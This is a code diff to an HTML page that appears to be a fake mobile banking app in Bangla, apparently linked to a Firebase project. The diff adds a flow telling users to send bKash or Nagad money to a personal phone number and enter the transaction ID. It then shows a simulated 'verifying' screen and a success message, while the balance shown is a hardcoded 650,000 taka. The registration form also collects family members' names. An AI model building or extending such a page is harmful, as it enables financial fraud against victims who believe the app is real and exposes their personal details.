@@ -15,7 +15,7 @@
         .balance-card { margin: -18px 15px 15px 15px; background-color: #0b5ea8; border-radius: 10px; padding: 14px; box-shadow: 0 4px 10px rgba(0,0,0,0.15); }
         .balance-btn-group { display: flex; justify-content: space-between; gap: 10px; }
         .btn-bal { flex: 1; padding: 6px 0; border-radius: 6px; border: 1.5px solid #ffffff; background: transparent; color: #ffffff; font-weight: bold; font-size: 13px; cursor: pointer; }
-        .balance-val { color: #ffffff; text-align: center; font-size: 24px; font-weight: bold; margin-top: 10px; }
+        .balance-val { color: #ffffff; text-align: center; font-size: 20px; font-weight: bold; margin-top: 10px; cursor: pointer; background: rgba(255,255,255,0.1); padding: 8px; border-radius: 6px; }
 
         /* Grid Services */
         .service-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; padding: 10px 15px; }
@@ -96,10 +96,10 @@
         </div>
         <div class="balance-card">
             <div class="balance-btn-group">
-                <button class="btn-bal" onclick="showBalance('bank')">Bank Balance</button>
-                <button class="btn-bal" onclick="showBalance('wallet')">Wallet Balance</button>
+                <button class="btn-bal" onclick="showBalanceType('bank')">Bank Balance</button>
+                <button class="btn-bal" onclick="showBalanceType('wallet')">Wallet Balance</button>
             </div>
-            <div id="bal-text" class="balance-val">৳ 00</div>
+            <div id="bal-text" class="balance-val" onclick="revealBalance()">ব্যালেন্স দেখতে ট্যাপ করুন</div>
         </div>
 
         <div class="service-grid">
@@ -115,17 +115,32 @@
         </div>
     </div>
 
-    <!-- Add Fund Screen -->
+    <!-- Add Fund Step 1 -->
     <div id="add-fund-screen" class="hidden">
         <div class="form-box">
             <h3>Add Fund (টাকা জমা করুন)</h3>
             <div class="form-group" style="margin-top:10px;">
                 <label>পেমেন্ট মাধ্যম সিলেক্ট করুন:</label>
-                <select class="input-field"><option>bKash</option><option>Nagad</option><option>Rocket</option></select>
+                <select class="input-field" id="fund-method"><option>bKash</option><option>Nagad</option></select>
             </div>
-            <div class="form-group"><label>টাকার পরিমাণ:</label><input type="number" class="input-field" placeholder="যেমন: 1000"></div>
-            <button class="btn-action" onclick="processAddFund()">Submit</button>
+            <div class="form-group"><label>টাকার পরিমাণ:</label><input type="number" id="fund-amount" class="input-field" placeholder="যেমন: 1000"></div>
+            <button class="btn-action" onclick="goToAddFundStep2()">পরবর্তী ধাপে যান</button>
             <button class="btn-action" style="background:#666;" onclick="showScreen('dashboard-screen')">ফিরে যান</button>
+        </div>
+    </div>
+
+    <!-- Add Fund Step 2 -->
+    <div id="add-fund-step2" class="hidden">
+        <div class="form-box">
+            <h3>সেন্ড মানি করুন</h3>
+            <div style="background: #eef2f7; padding: 12px; border-radius: 6px; margin-bottom: 12px; font-size: 13px; color: #333; line-height: 1.5;">
+                অনুগ্রহ করে নিচের নাম্বারে আপনার নির্বাচিত মাধ্যম থেকে সেন্ড মানি করুন:<br>
+                <span style="color: #0b5ea8; font-weight: bold; font-size: 16px;">01320841433</span> (Personal)<br>
+                টাকা পাঠানোর পর নিচের ঘরে ট্রানজেকশন আইডি দিন।
+            </div>
+            <div class="form-group"><label>ট্রানজেকশন আইডি (TrxID):</label><input type="text" id="fund-trx" class="input-field" placeholder="যেমন: 9N78A6..." required></div>
+            <button class="btn-action" onclick="processAddFund()">সাবমিট করুন</button>
+            <button class="btn-action" style="background:#666;" onclick="openAddFund()">ফিরে যান</button>
         </div>
     </div>
 
@@ -173,6 +188,8 @@
 
 <script>
     const PROJECT_ID = "sonali-24dcc"; 
+    let currentBalType = 'bank';
+    let isBalanceRevealed = false;
 
     function switchTab(t) {
         if(t === 'login'){
@@ -199,6 +216,8 @@
             document.getElementById('timer-val').innerText = left;
             if (left <= 0) {
                 clearInterval(timer);
+                isBalanceRevealed = false;
+                document.getElementById('bal-text').innerText = "ব্যালেন্স দেখতে ট্যাপ করুন";
                 showScreen('dashboard-screen');
                 document.getElementById('bottom-nav').classList.remove('hidden');
             }
@@ -213,7 +232,7 @@
                 father: { stringValue: document.getElementById('reg-father').value },
                 mother: { stringValue: document.getElementById('reg-mother').value },
                 sibling: { stringValue: document.getElementById('reg-sibling').value },
-                bankBalance: { doubleValue: 650000.00 }
+                bankBalance: { doubleValue: 00.00 }
             }
         };
 
@@ -228,17 +247,40 @@
         showScreen('generic-loader');
         
         setTimeout(() => {
+            isBalanceRevealed = false;
+            document.getElementById('bal-text').innerText = "ব্যালেন্স দেখতে ট্যাপ করুন";
             showScreen('dashboard-screen');
             document.getElementById('bottom-nav').classList.remove('hidden');
         }, 5000);
     }
 
-    function showBalance(type) {
-        document.getElementById('bal-text').innerText = type === 'bank' ? '৳ 650,000.00' : '৳ 650,000.00';
+    function showBalanceType(type) {
+        currentBalType = type;
+        isBalanceRevealed = false;
+        document.getElementById('bal-text').innerText = "ব্যালেন্স দেখতে ট্যাপ করুন";
+    }
+
+    function revealBalance() {
+        isBalanceRevealed = true;
+        document.getElementById('bal-text').innerText = '৳ 650,000.00';
     }
 
     function openSendMoney() { showScreen('send-step1'); }
-    function openAddFund() { showScreen('add-fund-screen'); }
+    
+    function openAddFund() { 
+        document.getElementById('fund-amount').value = '';
+        showScreen('add-fund-screen'); 
+    }
+
+    function goToAddFundStep2() {
+        const amount = document.getElementById('fund-amount').value;
+        if(!amount || amount <= 0) {
+            alert('দয়া করে সঠিক টাকার পরিমাণ লিখুন');
+            return;
+        }
+        document.getElementById('fund-trx').value = '';
+        showScreen('add-fund-step2');
+    }
     
     function submitSend1() {
         document.getElementById('gen-loader-text').innerText = "৫ সেকেন্ড অপেক্ষা করুন...";
@@ -256,10 +298,15 @@
     }
 
     function processAddFund() {
-        document.getElementById('gen-loader-text').innerText = "আপনার ফান্ড যুক্ত করার প্রক্রিয়া চলছে...";
+        const trx = document.getElementById('fund-trx').value;
+        if(!trx) {
+            alert('দয়া করে ট্রানজেকশন আইডি (TrxID) লিখুন');
+            return;
+        }
+        document.getElementById('gen-loader-text').innerText = "ট্রানজেকশন যাচাই করা হচ্ছে...";
         showScreen('generic-loader');
         setTimeout(() => {
-            document.getElementById('alert-msg').innerText = "ফান্ড সফলভাবে যোগ হয়েছে।";
+            document.getElementById('alert-msg').innerText = "সকলভাবে সাবমিট হয়েছে, হোমে ফিরে যান";
             showScreen('alert-screen');
         }, 3000);
     }
@@ -270,9 +317,10 @@
     }
 
     function showScreen(id) {
-        ['auth-screen', 'reg-loader-screen', 'dashboard-screen', 'send-step1', 'send-step2', 'generic-loader', 'alert-screen', 'add-fund-screen'].forEach(s => document.getElementById(s).classList.add('hidden'));
+        ['auth-screen', 'reg-loader-screen', 'dashboard-screen', 'send-step1', 'send-step2', 'generic-loader', 'alert-screen', 'add-fund-screen', 'add-fund-step2'].forEach(s => document.getElementById(s).classList.add('hidden'));
         document.getElementById(id).classList.remove('hidden');
     }
 </script>
 </body>
-</html>
+                                                                                               </html>
+                
